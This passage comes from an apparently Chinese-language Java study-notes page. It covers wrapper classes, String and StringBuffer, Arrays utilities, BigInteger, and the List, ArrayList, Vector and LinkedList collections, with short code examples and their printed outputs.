出现异常，出现异常的代码后面不会执行</p><h1 id="throws-与-throw"><a href="#throws-与-throw" class="headerlink" title="throws 与 throw"></a>throws 与 throw</h1><p>抛出异常要与父类一致</p><p>throw: 后面跟异常对象</p><p>throws: 做异常处理方式，在方法中</p><h1 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h1><h2 id="包装类型和-String-类型的转换"><a href="#包装类型和-String-类型的转换" class="headerlink" title="包装类型和 String 类型的转换"></a>包装类型和 String 类型的转换</h2><p>a) 包装类型转 String 类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i=<span class="hljs-number">10</span>;<br> String s1=i.toString();<br> String s2=String.valueOf(i);<br> String s3=i+<span class="hljs-string">&quot;&quot;</span>;<br> System.out.println(s1);<br> System.out.println(s2);<br> System.out.println(s3);<br></code></pre></td></tr></table></figure><p>b）String 类型转包装类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(s1);<br>   Integer i2=Integer.valueOf(s2);<br>   Integer i3=Integer.parseInt(s3);<br>   System.out.println(i1);<br>   System.out.println(i2);<br>   System.out.println(i3);<br></code></pre></td></tr></table></figure><p>c）例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">Object obj1=<span class="hljs-literal">true</span>?<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<span class="hljs-comment">//三元条件运算符是一个整体</span><br>   System.out.println(obj1);<span class="hljs-comment">//1.0</span><br><br>Object obj2;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-literal">true</span>)&#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   &#125;<span class="hljs-keyword">else</span> &#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<br>   &#125;<br>   System.out.println(obj2);<span class="hljs-comment">//1</span><br><br><br>Integer i=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   Integer j=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   System.out.println(i==j);  <span class="hljs-comment">//false</span><br>   <br>   Integer m=<span class="hljs-number">1</span>;<br>   Integer n=<span class="hljs-number">1</span>;<br>   System.out.println(m==n);<span class="hljs-comment">//True,指向同一个对象</span><br>   <br>   Integer x=<span class="hljs-number">128</span>;<br>   Integer y=<span class="hljs-number">128</span>;<br>   System.out.println(x==y);<span class="hljs-comment">//False超过范围，通过new去创建，不等</span><br>   <br>   Integer a=<span class="hljs-number">128</span>;<br>   <span class="hljs-type">int</span> b=<span class="hljs-number">128</span>;<br>   System.out.println(a==b);<span class="hljs-comment">//True,存在基本数据类型，比较的是值</span><br><br></code></pre></td></tr></table></figure><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>final 类，不能被继承</li><li>直接赋值，调用构造器</li><li>属性 private final char value[ ];存放字符串内容</li></ul><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;abcd&quot;</span>;<span class="hljs-comment">//指向常量池</span><br>String b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<span class="hljs-comment">//指向对象，对象指向常量池</span><br>System.out.println(a.equals(b)); <span class="hljs-comment">//True</span><br>System.out.println(a==b);<span class="hljs-comment">//False</span><br></code></pre></td></tr></table></figure><h2 id="常量池字符串"><a href="#常量池字符串" class="headerlink" title="常量池字符串"></a>常量池字符串</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String s1=<span class="hljs-string">&quot;hello&quot;</span>+<span class="hljs-string">&quot;java&quot;</span>;<br><span class="hljs-comment">//hellojava</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;hell&quot;</span>;<br>String b=<span class="hljs-string">&quot;jab&quot;</span>;<br>String c=a+b;<span class="hljs-comment">//new 了一个对象</span><br>String d=<span class="hljs-string">&quot;helljab&quot;</span>;<br>System.out.println(c==d);<br><span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">String str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>     <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] ch=&#123;<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>&#125;;<br>     change(str,ch);<br>     System.out.println(str);<br>     System.out.println(ch);<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(String str,<span class="hljs-type">char</span> ch[])</span>&#123;<br>     str=<span class="hljs-string">&quot;java&quot;</span>;<br>     ch[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;a&#x27;</span>;<br> &#125;<br> <br> <span class="hljs-comment">//aava</span><br></code></pre></td></tr></table></figure><h1 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">String name=<span class="hljs-string">&quot;我虽然&quot;</span>;<br>String ISO_s=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(name.getBytes(StandardCharsets.UTF_8),StandardCharsets.ISO_8859_1);<br>System.out.println(ISO_s);<br>String UTF8_s= <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(ISO_s.getBytes(StandardCharsets.ISO_8859_1),StandardCharsets.UTF_8);<br> System.out.println(UTF8_s);<br></code></pre></td></tr></table></figure><h1 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h1><h2 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h2><ul><li>不能被继承</li><li>父类是 AbstractStringBuilder</li><li>AbstractStringBuilder 有属性 char[] value,存放在堆中</li></ul><h2 id="StingBuffer-和-String-的转换"><a href="#StingBuffer-和-String-的转换" class="headerlink" title="StingBuffer 和 String 的转换"></a>StingBuffer 和 String 的转换</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">StringBuffer stringBuffer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<br>stringBuffer=stringBuffer.append(<span class="hljs-string">&quot;ac&quot;</span>)<br>String s=stringBuffer.toString();<br>String ss=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(stringBuffer);<br>System.out.println(s);<br><span class="hljs-comment">//abcdac</span><br></code></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>append，toString</p><h2 id="String、StringBuffer、StringBuider"><a href="#String、StringBuffer、StringBuider" class="headerlink" title="String、StringBuffer、StringBuider"></a>String、StringBuffer、StringBuider</h2><p>StringBuider 效率最高，拼接字符串</p><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p> sort 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">Person abc=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">30</span>);<br>        Person umr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;umr&quot;</span>,<span class="hljs-number">23</span>);<br>        Person acd=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;acd&quot;</span>,<span class="hljs-number">40</span>);<br>        Person[] aaa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[]&#123;abc,umr,acd&#125;;<br>        Arrays.sort(aaa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> ((Person)o1) .age -((Person)o2).age;<br>                <span class="hljs-keyword">return</span> i;<br>            &#125;<br>        &#125;);<br>        System.out.println(Arrays.toString(aaa));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>        String name=<span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-built_in">this</span>.name=name;<br>            <span class="hljs-built_in">this</span>.age=age;<br>        &#125;<br>        <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//[Person&#123;name=&#x27;umr&#x27;, age=23&#125;, Person&#123;name=&#x27;abc&#x27;, age=30&#125;, Person&#123;name=&#x27;acd&#x27;, age=40&#125;]</span><br></code></pre></td></tr></table></figure><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p>Arrays.toString  返回数组的字符串形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer[] aa = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>[]&#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;<br>   Arrays.sort(aa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>           <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>               <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (Integer) o1 - (Integer) o2;<br>               <span class="hljs-keyword">return</span> i;<br>           &#125;<br>       &#125;);<br>   System.out.println(Arrays.toString(aa));<br>   <span class="hljs-comment">//[1, 2, 3, 4, 5, 6]</span><br></code></pre></td></tr></table></figure><p>Arrays.sort 自然排序和定制排序（数值排序、对象排序）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">参考前面的 <span class="hljs-built_in">sort</span> 方法例子<br></code></pre></td></tr></table></figure><p>Arrays.copyOf  数组元素的复制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>   <span class="hljs-type">int</span>[] bb=Arrays.copyOf(aa,aa.length);<br>   bb[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>   System.out.println(Arrays.toString(bb));<br></code></pre></td></tr></table></figure><p> Arrays.aslist 数组转化为 List 集合</p><p>Arrays.fill  数组填充</p><p>Arrays.binarySearch 二分查找（有序数组）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">11</span>);<br>        System.out.println(i);<br><span class="hljs-comment">// 10</span><br>前提：有序情况下<br><br>无序时，先排序<br><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>Arrays.sort(aa);<br>    System.out.println(Arrays.toString(aa));<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">2</span>);<br>    System.out.println(i);<br><span class="hljs-comment">//[0, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14]</span><br><span class="hljs-comment">//2</span><br><br>找不到就返回负数，-(low+<span class="hljs-number">1</span>)，low 为原本出现的位置，比如查找 <span class="hljs-number">10</span>，返回 -<span class="hljs-number">11</span> <br></code></pre></td></tr></table></figure><p>System.arraycopy   复制数组</p><p>System. currentTimeMillens( )返回当前距离时间</p><h2 id="BigInteger"><a href="#BigInteger" class="headerlink" title="BigInteger"></a>BigInteger</h2><p>保存比较大的数</p><p>BigDecimal  保存精度更高的小数</p><ul><li>add  加</li><li>subtract 减</li><li>multiply 乘</li><li>divide 除</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">BigInteger bigInteger1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;111111111111111111111111111111111111111&quot;</span>);<br>BigInteger bigInteger2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;100&quot;</span>);<br><br>BigInteger add=bigInteger1.add(bigInteger2);<br>System.out.println(add);<br><br>BigInteger subtract=bigInteger1.subtract(bigInteger2);<br>System.out.println(subtract);<br><br>BigInteger multiply=bigInteger1.multiply(bigInteger2);<br>System.out.println(multiply);<br><br>BigInteger divide=bigInteger1.divide(bigInteger2);<br>System.out.println(divide);<br></code></pre></td></tr></table></figure><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="集合框架体系"><a href="#集合框架体系" class="headerlink" title="集合框架体系"></a>集合框架体系</h2><ul><li>主要是两组 Collection 和 Map （单列集合，双列集合）</li><li>Collection 接口有两个子接口 List、Set，其实现子类都是单列集合</li><li>Map 接口的实现子类是双列集合，存放的 K-V</li></ul><h2 id="Collection-接口"><a href="#Collection-接口" class="headerlink" title="Collection 接口"></a>Collection 接口</h2><ul><li><p>add 添加单个元素，都是Object ，基本数据类型加入的是包装类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection collection=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>  collection.add(<span class="hljs-number">100</span>);<br>  collection.add(<span class="hljs-string">&quot;java&quot;</span>);<br>  collection.add(<span class="hljs-literal">false</span>);<br>  collection.add(<span class="hljs-literal">null</span>);<br>  System.out.println(collection);<br></code></pre></td></tr></table></figure></li><li><p>remove 删除指定元素，List 的子类有重载，可以按 index 删除</p></li><li><p>contains 查找元素是否存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">collection.contains(<span class="hljs-literal">false</span>);<br>   System.out.println(collection.contains(<span class="hljs-literal">false</span>));<br></code></pre></td></tr></table></figure></li><li><p>size 获取元素个数</p></li><li><p>isEmpty 判断是否为空</p></li><li><p>clear 清空</p></li><li><p>addAll 查找多个元素是否存在</p></li><li><p>removeAll 删除多个元素</p></li></ul><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul><li>有序，可重复</li><li>void add ( int index,Object ele ) 在 index 位置插入 ele 元素</li><li>boolean addAll ( int index,Collection eles) 从 index 位置开始将 eles 中的所有元素添加进来</li><li>Object get ( int index) 获取指定 index 位置的元素</li><li>int indexOf（Object obj)返回 obj 在当前集合中最后一次出现的位置</li><li>Object remove ( int index) 移除指定 index 位置的元素，并返回此元素</li><li>Object set （ int index,Object ele )  设置指定 index 位置的元素为 ele，相当于替换</li><li>List sublist ( int fromIndex,int toIndex)  返回从 fromIndex 到 toIndex 位置的子集合</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list.add(<span class="hljs-string">&quot;javass&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;rr&quot;</span>);<br>   list.add(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;java&quot;</span>);<br>       <br>   List list2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list2.add(<span class="hljs-string">&quot;javass2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;rr2&quot;</span>);<br>   list.addAll(<span class="hljs-number">1</span>,list2);<br>   list.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>       <br>   System.out.println(list.get(<span class="hljs-number">4</span>));    <span class="hljs-comment">//urm</span><br>       <br>   System.out.println(list.indexOf(<span class="hljs-string">&quot;urm2&quot;</span>));       <span class="hljs-comment">//2</span><br>       <br>   System.out.println(list.lastIndexOf(<span class="hljs-string">&quot;urm&quot;</span>));        <span class="hljs-comment">//8</span><br>   list.remove(<span class="hljs-number">8</span>);<br>   list.set(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;urm4&quot;</span>);<br>   System.out.println(list.subList(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>));      <span class="hljs-comment">//[javass2, urm2, rr2]</span><br>   System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm4]</span><br></code></pre></td></tr></table></figure><h2 id="List-遍历"><a href="#List-遍历" class="headerlink" title="List 遍历"></a>List 遍历</h2><ul><li>适用于所有实现子类</li></ul><p>迭代器遍历</p><ul><li><p>Iterator 对象为迭代器，用于遍历 Collection 集合的元素</p></li><li><p>实现 Collection 接口的集合类都有 iterator( ) 方法，返回一个迭代器</p></li><li><p>Iterator 结构</p></li><li><p>Iterator 仅用于遍历集合，Iterator 本身并不存放对象</p></li><li><p>快捷输入 itit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=list.iterator();<br>    Object next=iterator.next();<br>    System.out.println(next);       <span class="hljs-comment">//javass</span><br>        <br>    Object next2=iterator.next();<br>    System.out.println(next2);          <span class="hljs-comment">//javass2</span><br>        <br>    System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm2, urm]</span><br><span class="hljs-comment">//相当于指针</span><br></code></pre></td></tr></table></figure></li></ul><p>增强 for 循环</p><ul><li>实际上还是迭代器遍历</li><li>快捷输入 iter&#x2F;xxx.for</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Object o : list) &#123;<br>   System.out.println(o);<br>&#125;<br>        <br><span class="hljs-comment">//javass</span><br>javass2<br>urm2<br>rr2<br>urm<br>java<br>rr<br>urm2<br>urm<br></code></pre></td></tr></table></figure><p>for 循环</p><ul><li>xxx.for</li><li>前提有索引</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>    System.out.println(list.get(i));<br>&#125;<br><span class="hljs-comment">//有索引</span><br></code></pre></td></tr></table></figure><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><ul><li>由数组实现数据存储</li><li>Vector 和 ArrayList 基本相同，Vector 线程安全，ArrayList 执行效率高</li></ul><p>ArrayList 扩容机制</p><ul><li>有一个 Object 类型的数组 elementData，存放元素 transient Object [ ] elementData</li><li>指定大小构造器</li></ul><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><ul><li>对象数组存放元素，protected Object [ ]  elementData</li><li>指定扩容个数        new Vector(10,3)</li></ul><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ul><li>双向链表，有两个属性 first 和 last 分别指向首节点和尾节点</li><li>每个节点（Node 对象）里面有 prev 、next、item三个属性，item 存放元素，prev 指向前一个节点，next 指向后一个节点</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java">   Node java= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>       Node rw=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>       Node urm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>       java.next=rw;<br>       rw.next=urm;<br>       <br>       urm.prev=rw;<br>       rw.prev=java;<br>       <br>       Node first=java;<br>       Node last=urm;<br>       <br>       Node temp=first;<br>       <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>           System.out.println(temp);<br>           temp=temp.next;<br>       &#125;<br>        <br>        temp=last;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.prev;<br>        &#125;<br>    <br>    &#125;<br>   <br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-keyword">public</span> Node prev;<br>    <span 